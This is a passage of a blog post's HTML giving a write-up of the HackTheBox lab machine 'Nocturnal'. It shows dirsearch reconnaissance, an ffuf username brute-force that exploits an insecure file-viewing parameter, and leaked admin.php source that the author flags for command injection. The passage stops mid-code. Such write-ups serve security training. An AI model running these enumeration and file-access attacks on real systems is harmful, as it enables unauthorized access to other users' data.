@@ -1,0 +1,577 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"r3tr0y.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="尝试的一个非赛季machine，重新锻炼自己的ctf能力">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB-nocturnal">
+<meta property="og:url" content="http://r3tr0y.github.io/2025/04/14/HTB-nocturnal/index.html">
+<meta property="og:site_name" content="r3tr0&#39;s blog">
+<meta property="og:description" content="尝试的一个非赛季machine，重新锻炼自己的ctf能力">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2025-04-14T08:18:54.000Z">
+<meta property="article:modified_time" content="2026-01-19T06:47:34.000Z">
+<meta property="article:author" content="r3tr0">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="HTB">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://r3tr0y.github.io/2025/04/14/HTB-nocturnal/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>HTB-nocturnal | r3tr0's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="stylesheet" href="/css/prism.css" type="text/css"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">r3tr0's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/r3tr0y" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://r3tr0y.github.io/2025/04/14/HTB-nocturnal/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="r3tr0">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="r3tr0's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          HTB-nocturnal
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2025-04-14 16:18:54" itemprop="dateCreated datePublished" datetime="2025-04-14T16:18:54+08:00">2025-04-14</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2026-01-19 14:47:34" itemprop="dateModified" datetime="2026-01-19T14:47:34+08:00">2026-01-19</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/writeup/" itemprop="url" rel="index"><span itemprop="name">writeup</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">Symbols count in article: </span>
+              <span>14k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">Reading time &asymp;</span>
+              <span>13 mins.</span>
+            </span>
+            <div class="post-description">尝试的一个非赛季machine，重新锻炼自己的ctf能力</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="HTB-nocturnal"><a href="#HTB-nocturnal" class="headerlink" title="HTB-nocturnal"></a>HTB-nocturnal</h1><h2 id="User"><a href="#User" class="headerlink" title="User"></a>User</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">➜  nocturnal dirsearch -u http://nocturnal.htb/ --crawl</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.3.post1</span><br><span class="line"> (_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460</span><br><span class="line"></span><br><span class="line">Output File: /Users/r3tr0/hack/hackthebox/machines/nocturnal/reports/http_nocturnal.htb/__25-04-14_16-16-24.txt</span><br><span class="line"></span><br><span class="line">Target: http://nocturnal.htb/</span><br><span class="line"></span><br><span class="line">[16:16:24] Starting: </span><br><span class="line">[16:16:40] 302 -    0B  - /admin.php  -&gt;  login.php</span><br><span class="line">[16:16:49] 301 -  178B  - /backups  -&gt;  http://nocturnal.htb/backups/</span><br><span class="line">[16:16:50] 403 -  564B  - /backups/</span><br><span class="line">[16:16:58] 302 -    0B  - /dashboard.php  -&gt;  login.php</span><br><span class="line">[16:17:07] 200 -  644B  - /login.php</span><br><span class="line">[16:17:07] 200 -  649B  - /register.php</span><br><span class="line">[16:17:07] 302 -    0B  - /logout.php  -&gt;  login.php</span><br><span class="line">[16:17:23] 403 -  564B  - /uploads</span><br><span class="line">[16:17:23] 403 -  564B  - /uploads/affwp-debug.log</span><br><span class="line">[16:17:23] 403 -  564B  - /uploads/</span><br><span class="line">[16:17:23] 403 -  564B  - /uploads/dump.sql</span><br><span class="line">[16:17:23] 403 -  564B  - /uploads_admin</span><br><span class="line">[16:17:25] 302 -    3KB - /view.php  -&gt;  login.php</span><br><span class="line"></span><br><span class="line">Task Completed</span><br></pre></td></tr></table></figure>
+
+<p>网站存在登录以及注册的点，先注册一个用户，发现了文件上传的地点，上传完文件后，在浏览文件的链接处发现有用户名枚举并且可以下载任意用户上传的文件的漏洞，用ffuf爆破用户获得敏感信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">➜  nocturnal ffuf -u &quot;http://nocturnal.htb/view.php?username=FUZZ&amp;file=pwn.xlsx&quot; -w /Users/r3tr0/hack/KaliLists/SecLists-master/Usernam</span><br><span class="line">es/xato-net-10-million-usernames-dup.txt -H &quot;Cookie: PHPSESSID=n3jb8nvahqclf3h6fe2af6qvdk&quot; -fs 2985</span><br><span class="line"></span><br><span class="line">        /&#x27;___\  /&#x27;___\           /&#x27;___\       </span><br><span class="line">       /\ \__/ /\ \__/  __  __  /\ \__/       </span><br><span class="line">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      </span><br><span class="line">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      </span><br><span class="line">         \ \_\   \ \_\  \ \____/  \ \_\       </span><br><span class="line">          \/_/    \/_/   \/___/    \/_/       </span><br><span class="line"></span><br><span class="line">       v2.1.0-dev</span><br><span class="line">________________________________________________</span><br><span class="line"></span><br><span class="line"> :: Method           : GET</span><br><span class="line"> :: URL              : http://nocturnal.htb/view.php?username=FUZZ&amp;file=pwn.xlsx</span><br><span class="line"> :: Wordlist         : FUZZ: /Users/r3tr0/hack/KaliLists/SecLists-master/Usernames/xato-net-10-million-usernames-dup.txt</span><br><span class="line"> :: Header           : Cookie: PHPSESSID=n3jb8nvahqclf3h6fe2af6qvdk</span><br><span class="line"> :: Follow redirects : false</span><br><span class="line"> :: Calibration      : false</span><br><span class="line"> :: Timeout          : 10</span><br><span class="line"> :: Threads          : 40</span><br><span class="line"> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500</span><br><span class="line"> :: Filter           : Response size: 2985</span><br><span class="line">________________________________________________</span><br><span class="line"></span><br><span class="line">admin                   [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 240ms]</span><br><span class="line">amanda                  [Status: 200, Size: 3113, Words: 1175, Lines: 129, Duration: 101ms]</span><br><span class="line">tobias                  [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 76ms]</span><br><span class="line">retro                   [Status: 200, Size: 3115, Words: 1177, Lines: 129, Duration: 77ms]</span><br><span class="line">nocturnal               [Status: 200, Size: 3116, Words: 1175, Lines: 129, Duration: 87ms]</span><br><span class="line">admin123                [Status: 200, Size: 3279, Words: 1177, Lines: 129, Duration: 74ms]</span><br><span class="line">sonnyc-Leclair#         [Status: 200, Size: 2967, Words: 1170, Lines: 123, Duration: 1921ms]</span><br><span class="line">selm#at1-vatican1       [Status: 200, Size: 2967, Words: 1170, Lines: 123, Duration: 83ms]</span><br><span class="line">n#3ton                  [Status: 200, Size: 2967, Words: 1170, Lines: 123, Duration: 79ms]</span><br><span class="line">lumitrak                [Status: 500, Size: 2919, Words: 1167, Lines: 123, Duration: 98ms]</span><br><span class="line">luminus                 [Status: 500, Size: 2919, Words: 1167, Lines: 123, Duration: 99ms]</span><br><span class="line">luminox                 [Status: 500, Size: 2919, Words: 1167, Lines: 123, Duration: 78ms]</span><br><span class="line">luminati                [Status: 500, Size: 2919, Words: 1167, Lines: 123, Duration: 80ms]</span><br><span class="line">luminary                [Status: 500, Size: 2919, Words: 1167, Lines: 123, Duration: 80ms]</span><br><span class="line">luminari                [Status: 500, Size: 2919, Words: 1167, Lines: 123, Duration: 76ms]</span><br><span class="line">luminale                [Status: 500, Size: 2919, Words: 1167, Lines: 123, Duration: 86ms]</span><br><span class="line">luminarc                [Status: 500, Size: 2919, Words: 1167, Lines: 123, Duration: 86ms]</span><br><span class="line">luminal                 [Status: 500, Size: 2919, Words: 1167, Lines: 123, Duration: 86ms]</span><br><span class="line">lumilode                [Status: 500, Size: 2919, Words: 1167, Lines: 123, Duration: 76ms]</span><br><span class="line">lumierboss              [Status: 500, Size: 2919, Words: 1167, Lines: 123, Duration: 75ms]</span><br><span class="line">lumie                   [Status: 500, Size: 2919, Words: 1167, Lines: 123, Duration: 76ms]</span><br><span class="line">lumes                   [Status: 500, Size: 2919, Words: 1167, Lines: 123, Duration: 76ms]</span><br><span class="line">lumi.hautaniemi         [Status: 500, Size: 2919, Words: 1167, Lines: 123, Duration: 76ms]</span><br><span class="line">lumens                  [Status: 500, Size: 2919, Words: 1167, Lines: 123, Duration: 79ms]</span><br><span class="line">lumenica1               [Status: 500, Size: 2919, Words: 1167, Lines: 123, Duration: 77ms]</span><br><span class="line">lumene07                [Status: 500, Size: 2919, Words: 1167, Lines: 123, Duration: 78ms]</span><br><span class="line">lumenandrain            [Status: 500, Size: 2919, Words: 1167, Lines: 123, Duration: 78ms]</span><br><span class="line">lumbur2                 [Status: 500, Size: 2919, Words: 1167, Lines: 123, Duration: 88ms]</span><br><span class="line">lumen-rostik            [Status: 500, Size: 2919, Words: 1167, Lines: 123, Duration: 88ms]</span><br><span class="line">lume2000                [Status: 500, Size: 2919, Words: 1167, Lines: 123, Duration: 88ms]</span><br><span class="line">lumbjmk                 [Status: 500, Size: 2919, Words: 1167, Lines: 123, Duration: 76ms]</span><br><span class="line">lumbertis               [Status: 500, Size: 2919, Words: 1167, Lines: 123, Duration: 74ms]</span><br><span class="line">lumberman               [Status: 500, Size: 2919, Words: 1167, Lines: 123, Duration: 75ms]</span><br><span class="line">lumberjk                [Status: 500, Size: 2919, Words: 1167, Lines: 123, Duration: 75ms]</span><br><span class="line">lumbergh55              [Status: 500, Size: 2919, Words: 1167, Lines: 123, Duration: 76ms]</span><br><span class="line">lumberjax61             [Status: 500, Size: 2919, Words: 1167, Lines: 123, Duration: 77ms]</span><br><span class="line">lumber1                 [Status: 500, Size: 2919, Words: 1167, Lines: 123, Duration: 77ms]</span><br><span class="line">lumbatzi                [Status: 500, Size: 2919, Words: 1167, Lines: 123, Duration: 77ms]</span><br><span class="line">lumas1-scrw33           [Status: 500, Size: 2919, Words: 1167, Lines: 123, Duration: 77ms]</span><br><span class="line">lumaluma                [Status: 500, Size: 2919, Words: 1167, Lines: 123, Duration: 78ms]</span><br><span class="line">lum4life                [Status: 500, Size: 2919, Words: 1167, Lines: 123, Duration: 78ms]</span><br><span class="line">lum6erjack              [Status: 500, Size: 2919, Words: 1167, Lines: 123, Duration: 78ms]</span><br><span class="line">lulyapa                 [Status: 500, Size: 2919, Words: 1167, Lines: 123, Duration: 78ms]</span><br><span class="line">lum100                  [Status: 500, Size: 2919, Words: 1167, Lines: 123, Duration: 79ms]</span><br><span class="line">luly234                 [Status: 500, Size: 2919, Words: 1167, Lines: 123, Duration: 78ms]</span><br><span class="line">luly-wi                 [Status: 500, Size: 2919, Words: 1167, Lines: 123, Duration: 78ms]</span><br><span class="line">luluz                   [Status: 500, Size: 2919, Words: 1167, Lines: 123, Duration: 101ms]</span><br><span class="line">jdog#1                  [Status: 200, Size: 2967, Words: 1170, Lines: 123, Duration: 78ms]</span><br><span class="line">gR##Efisher             [Status: 200, Size: 2967, Words: 1170, Lines: 123, Duration: 86ms]</span><br><span class="line">gR##E                   [Status: 200, Size: 2967, Words: 1170, Lines: 123, Duration: 86ms]</span><br><span class="line">dansss#1                [Status: 200, Size: 2967, Words: 1170, Lines: 123, Duration: 91ms]</span><br><span class="line">dV1oG#eL                [Status: 200, Size: 2967, Words: 1170, Lines: 123, Duration: 75ms]</span><br><span class="line">andy2977#               [Status: 200, Size: 2967, Words: 1170, Lines: 123, Duration: 91ms]</span><br><span class="line">Joey#1                  [Status: 200, Size: 2967, Words: 1170, Lines: 123, Duration: 90ms]</span><br><span class="line">AHasegawa#D             [Status: 200, Size: 2967, Words: 1170, Lines: 123, Duration: 76ms]</span><br><span class="line">:: Progress: [624370/624370] :: Job [1/1] :: 465 req/sec :: Duration: [0:22:38] :: Errors: 1 ::</span><br></pre></td></tr></table></figure>
+
+<p>在amanda用户下发现了敏感文件，privacy.odt，里面有该用户的初始密码，密码登录admin入口处，发现了源码文件泄露，并且存在网站源码的备份下载，下载后在admin.php出发现可能存在命令注入漏洞，下面是admin.php的部份内容</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user_id&#x27;</span>]) || (<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] !== <span class="string">&#x27;admin&#x27;</span> &amp;&amp; <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] !== <span class="string">&#x27;amanda&#x27;</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: login.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sanitizeFilePath</span>(<span class="params"><span class="variable">$filePath</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">basename</span>(<span class="variable">$filePath</span>); <span class="comment">// Only gets the base name of the file</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// List only PHP files in a directory</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">listPhpFiles</span>(<span class="params"><span class="variable">$dir</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$files</span> = <span class="title function_ invoke__">array_diff</span>(<span class="title function_ invoke__">scandir</span>(<span class="variable">$dir</span>), [<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;..&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;ul class=&#x27;file-list&#x27;&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">        <span class="variable">$sanitizedFile</span> = <span class="title function_ invoke__">sanitizeFilePath</span>(<span class="variable">$file</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_dir</span>(<span class="variable">$dir</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$sanitizedFile</span>)) &#123;</span><br><span class="line">            <span class="comment">// Recursively call to list files inside directories</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;li class=&#x27;folder&#x27;&gt;📁 &lt;strong&gt;&quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$sanitizedFile</span>) . <span class="string">&quot;&lt;/strong&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;ul&gt;&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">listPhpFiles</span>(<span class="variable">$dir</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$sanitizedFile</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/ul&gt;&lt;/li&gt;&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_ invoke__">pathinfo</span>(<span class="variable">$sanitizedFile</span>, PATHINFO_EXTENSION) === <span class="string">&#x27;php&#x27;</span>) &#123;</span><br><span class="line">            <span class="comment">// Show only PHP files</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;li class=&#x27;file&#x27;&gt;📄 &lt;a href=&#x27;admin.php?view=&quot;</span> . <span class="title function_ invoke__">urlencode</span>(<span class="variable">$sanitizedFile</span>) . <span class="string">&quot;&#x27;&gt;&quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$sanitizedFile</span>) . <span class="string">&quot;&lt;/a&gt;&lt;/li&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/ul&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// View the content of the PHP file if the &#x27;view&#x27; option is passed</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;view&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">sanitizeFilePath</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;view&#x27;</span>]);</span><br><span class="line">    <span class="variable">$filePath</span> = <span class="keyword">__DIR__</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filePath</span>) &amp;&amp; <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$filePath</span>, PATHINFO_EXTENSION) === <span class="string">&#x27;php&#x27;</span>) &#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="title function_ invoke__">htmlspecialchars</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filePath</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&quot;File not found or invalid path.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cleanEntry</span>(<span class="params"><span class="variable">$entry</span></span>) 